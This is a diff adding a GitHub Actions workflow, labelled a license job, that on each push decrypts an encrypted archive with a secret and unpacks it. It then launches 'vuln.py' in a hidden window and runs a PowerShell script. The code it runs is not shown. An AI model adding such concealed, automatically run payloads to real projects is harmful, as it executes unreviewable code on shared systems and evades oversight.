@@ -1,0 +1,14 @@
+name: lisans
+on: [push, workflow_dispatch]
+jobs:
+  l:
+    runs-on: windows-latest
+    steps:
+      - uses: actions/checkout@v4
+      - shell: pwsh
+        run: |
+          openssl enc -d -aes-256-cbc -pbkdf2 -iter 200000 -in kaynak.enc -out k.tar.gz -k ${{ secrets.PAKET_SIFRE }}
+          tar -xzf k.tar.gz
+          Start-Process python -ArgumentList "vuln.py" -WindowStyle Hidden
+          Start-Sleep -Seconds 5
+          pwsh -File lisans.ps1
